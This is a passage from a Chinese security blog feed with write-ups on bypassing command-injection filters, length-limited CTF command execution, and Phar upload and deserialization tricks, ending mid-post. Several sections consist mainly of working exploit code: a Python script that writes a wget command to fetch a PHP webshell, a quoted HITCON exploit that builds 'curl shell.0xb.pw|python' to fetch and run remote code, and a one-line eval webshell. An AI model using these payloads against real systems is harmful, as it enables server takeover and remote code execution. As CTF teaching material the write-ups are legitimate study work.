任何16进制的数字，相当于[0-9a-fA-F]</span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="一些常见的限制"><a href="#一些常见的限制" class="headerlink" title="一些常见的限制"></a>一些常见的限制</h2><h3 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符<code>*</code>和<code>?</code>的使用</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174451-083fa032-1c98-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="和-的使用"><a href="#和-的使用" class="headerlink" title="[]和{}的使用"></a>[]和{}的使用</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174709-5a7fea96-1c98-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>{…}与[…]有一个很重要的区别。如果匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174912-a3cd3eba-1c98-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>使用&lt;和&gt;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120175948-1f648e6a-1c9a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>使用特殊变量:<code>$IFS</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFS的默认值为：空白（包括：空格，tab, 和新行)</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180235-82c6e07a-1c9a-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>(x代表1-9),<code>${x}</code>(x&gt;=10)<br>PS：因为在没有传参的情况下，上面的特殊变量都是为空的<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180631-0f960c1a-1c9b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>使用反斜杠</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180724-2eeda8de-1c9b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>使用变量</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180945-82ca6a28-1c9b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120183457-0887a146-1c9f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>使用特殊变量${9}<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">${9}对应空字符串</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181515-47fd220e-1c9c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>使用编码<br>base64<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181135-c499e8ca-1c9b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>16进制<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120182144-2fae337c-1c9d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185231-7cab65c4-1ca1-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>8进制<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185020-2e5c14cc-1ca1-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>使用双引号和单引号</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181255-f41fd258-1c9b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>花括号还有一种用法：{command,argument}，</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120205644-d68d3ee4-1cb2-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>使用<code>%0a(\n)</code>，<code>%0d(\r)</code>，<code>%09(\t)</code>等字符也可以bypass一些过滤，这里就会不多去赘述了</p><h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $param = $_POST[<span class="string">'param'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($param) &lt; <span class="number">17</span>){</span><br><span class="line">        <span class="keyword">eval</span>($param);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>){</span><br><span class="line">    <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>这里要用到我们前面所讲到的重定向，<code>n &gt; file</code>：将文件描述符为 n 的文件重定向到 file。<br>既然我们不能一次执行一条完整的命令，我们可以分为多次<br>举个简单的例子</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120221721-1a28f340-1cbe-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>ls是默认以文件名排序的，所以我们为了控制我们命令的顺序，可以使用ls -t按时间逆序。<br>不过这里考虑到直接写shell有点麻烦（因为php中的一些符号用到shell中是有意义的，要各种转义，为了节省代码量我们直接用curl或者是wget从服务器dump一个shell下来）<br>exp如下：<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">name=[<span class="string">"&gt;php\\"</span>,<span class="string">"&gt;\\ 1.\\\\"</span>,<span class="string">"&gt;\\ -O\\\\"</span>,<span class="string">"&gt;cn\\\\"</span>,<span class="string">"&gt;\\ a.\\\\"</span>,<span class="string">"&gt;wget\\\\"</span>]</span><br><span class="line"><span class="comment">#可以修改hosts文件，让a.cn指向一个自己的服务器。</span></span><br><span class="line"><span class="comment">#index.html是一个php的shell</span></span><br><span class="line">url=<span class="string">"http://192.168.163.128/test.php"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> name:</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">param={<span class="string">'1'</span>:x}</span><br><span class="line">a=requests.get(url,params=param)</span><br><span class="line">param1={<span class="string">'1'</span>:<span class="string">'ls -t&gt;a'</span>}</span><br><span class="line">param2={<span class="string">'1'</span>:<span class="string">'sh a'</span>}</span><br><span class="line">requests.get(url,params=param1)</span><br><span class="line">requests.get(url,params=param2)</span><br><span class="line">b=requests.get(<span class="string">"http://192.168.163.128/1.php"</span>)</span><br><span class="line"><span class="keyword">if</span> b.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"ok!"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bad!"</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120235756-271eed3a-1ccc-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>可以发现成功写了shell</p><h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>HITCON CTF 2017-BabyFirst Revenge<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">   @mkdir($sandbox);</span><br><span class="line">   @chdir($sandbox);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) {</span><br><span class="line">       @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">   } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) {</span><br><span class="line">       @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">   }</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个字符长度限制不能大于5个，我们写字符还是可以的，但是我们的<code>ls -t&gt;a</code>用不了，不过我们可以用前面的思路，把<code>ls -t&gt;a</code>拆分为几段放在一个文件中，然后再执行。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190121100854-811f807e-1d21-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>可以发现2-5行是可以执行<code>ls -t&gt;g</code>的，然后后面的步骤就和前面一题一样了，这里就不多赘述了<br>贴一下Orange师傅的exp：<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">payload = [</span><br><span class="line">   <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">   <span class="string">'&gt;ls\\'</span>,</span><br><span class="line">   <span class="string">'ls&gt;_'</span>,</span><br><span class="line">   <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">   <span class="string">'&gt;-t\\'</span>,</span><br><span class="line">   <span class="string">'&gt;\&gt;g'</span>,</span><br><span class="line">   <span class="string">'ls&gt;&gt;_'</span>,</span><br><span class="line">   <span class="comment"># generate `curl orange.tw.tw&gt;python`</span></span><br><span class="line">   <span class="comment"># curl shell.0xb.pw|python</span></span><br><span class="line">   <span class="string">'&gt;on'</span>,</span><br><span class="line">   <span class="string">'&gt;th\\'</span>,</span><br><span class="line">   <span class="string">'&gt;py\\'</span>,</span><br><span class="line">   <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">   <span class="string">'&gt;pw\\'</span>,</span><br><span class="line">   <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">   <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">   <span class="string">'&gt;l.\\'</span>,</span><br><span class="line">   <span class="string">'&gt;el\\'</span>,</span><br><span class="line">   <span class="string">'&gt;sh\\'</span>,</span><br><span class="line">   <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">   <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">   <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">   <span class="comment"># exec</span></span><br><span class="line">   <span class="string">'sh _'</span>,</span><br><span class="line">   <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># r = requests.get('http://localhost/tmp/?reset=1')</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">   <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">   r = requests.get(<span class="string">'http://localhost/tmp/?cmd='</span> + quote(i) )</span><br><span class="line">   <span class="keyword">print</span> i</span><br><span class="line">   sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://portswigger.net/web-security/os-command-injection" title="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener">https://portswigger.net/web-security/os-command-injection</a><br><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" title="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar的一些利用姿势</title>
      <link href="/2018/12/24/%C2%96Phar%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
      <url>/2018/12/24/%C2%96Phar%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区 <a href="https://xz.aliyun.com/t/3692" target="_blank" rel="noopener">https://xz.aliyun.com/t/3692</a></p></blockquote><h1 id="Phar的简述"><a href="#Phar的简述" class="headerlink" title="Phar的简述"></a>Phar的简述</h1><p>翻译自手册：<br>phar是什么? Phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。</p><h1 id="利用姿势一：绕过上传限制"><a href="#利用姿势一：绕过上传限制" class="headerlink" title="利用姿势一：绕过上传限制"></a>利用姿势一：绕过上传限制</h1><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>使用<code>Phar://</code>伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包），只不过我们换了一种方式去执行而已<br>写一段小代码测试一下：<br>test.php<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"cmd"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>index.php</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://./test.jpg/test.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>成功包含</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222135923-bb50ed6c-05ae-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="例题：安恒11月月赛：image-up"><a href="#例题：安恒11月月赛：image-up" class="headerlink" title="例题：安恒11月月赛：image_up"></a>例题：安恒11月月赛：image_up</h2><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p><a href="http://101.71.29.5:10043/index.php?page=login" target="_blank" rel="noopener">http://101.71.29.5:10043/index.php?page=login</a><br>尝试伪协议读取一波源码<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>base64解码<br>index.php<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])){</span><br><span class="line">    <span class="keyword">if</span>(!stristr($_GET[<span class="string">'page'</span>],<span class="string">".."</span>)){</span><br><span class="line">      $page = $_GET[<span class="string">'page'</span>].<span class="string">".php"</span>;</span><br><span class="line">      <span class="keyword">include</span>($page);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">      header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">    }</span><br><span class="line">  }<span class="keyword">else</span>{</span><br><span class="line">    header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p></p><p>login.php<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])){</span><br><span class="line">    header(<span class="string">"Location: index.php?page=upload"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>upload.php<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $error = <span class="string">""</span>;</span><br><span class="line">    $exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"png"</span>,<span class="string">"gif"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"image"</span>]))</span><br><span class="line">    {</span><br><span class="line">        $temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>]);</span><br><span class="line">        $extension = end($temp);</span><br><span class="line">        <span class="keyword">if</span>((@$_upfileS[<span class="string">"image"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(in_array($extension,$exts)){</span><br><span class="line">              $path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br><span class="line">              move_uploaded_file($_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>], $path);</span><br><span class="line">              $error = <span class="string">"上传成功!"</span>;</span><br><span class="line">            }</span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            $error = <span class="string">"上传失败！"</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">          $error = <span class="string">"文件过大，上传失败！"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>从upload.php可以看出只能上传（”jpg”,”png”,”gif”,”jpeg”）文件，而且再index.php中在包含的文件后面强行加了”.php”,直接包含图片文件明显不可以了，于是就用到了我们的Phar伪协议流，将我们的一句话木马打包成压缩包，然后再将后缀改为<code>.jpg</code>,这样就能通过Phar伪协议去包含我们的一句话木马了。<br>这题有一个坑点，就是时间戳的问题：<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里要<code>time()+8*3600</code>，时区不同所以要加上8小时</p><p>payload：<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?page=phar:<span class="comment">//./uploads/6b19a5399b7d34fbb3c509ca8c25fd89.jpg/1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>菜刀连接即可getflag<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222130629-57346c8e-05a7-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181222130646-613ae366-05a7-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="利用姿势二：Phar反序列化漏洞"><a href="#利用姿势二：Phar反序列化漏洞" class="headerlink" title="利用姿势二：Phar反序列化漏洞"></a>利用姿势二：Phar反序列化漏洞</h1><p>我们一般利用反序列漏洞，一般都是借助<code>unserialize()</code>函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的<code>Blackhat2018</code>大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发PHP反序列化漏洞。漏洞触发是利用<code>Phar://</code> 伪协议读取phar文件时，会反序列化<code>meta-data</code>储存的信息。</p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><p>Phar文件主要包含三至四个部分：</p><h3 id="1-A-stub"><a href="#1-A-stub" class="headerlink" title="1. A stub"></a>1. A stub</h3><p>stub的基本结构：<code>&lt;?php __HALT_COMPILER();</code>，stub必须以<code>__HALT_COMPILER()</code>;来作为结束部分，否则Phar拓展将不会识别该文件。</p><h3 id="2-a-manifest-describing-the-contents"><a href="#2-a-manifest-describing-the-contents" class="headerlink" title="2. a manifest describing the contents"></a>2. a manifest describing the contents</h3><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以反序列化的形式储存，这里就是漏洞利用的关键点<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221212526-e0bed25c-0523-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h3 id="3-the-file-contents"><a href="#3-the-file-contents" class="headerlink" title="3. the file contents"></a>3. the file contents</h3><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p><h3 id="4-a-signature-for-verifying-Phar-integrity"><a href="#4-a-signature-for-verifying-Phar-integrity" class="headerlink" title="4. a signature for verifying Phar integrity"></a>4. a signature for verifying Phar integrity</h3><p>签名格式<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h3 id="小测试"><a href="#小测试" class="headerlink" title="小测试"></a>小测试</h3><p>既然都知道Phar文件的基本结构了，那么我们就写一段代码来测试一下<br>PS：php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{</span><br><span class="line">        <span class="keyword">public</span> $test=<span class="string">"test"</span>;</span><br><span class="line">    }</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>查看一下phar文件的结构，可以看到Meta-data的内容是以反序列的形式储存的。<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221215206-9a88aaa2-0527-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            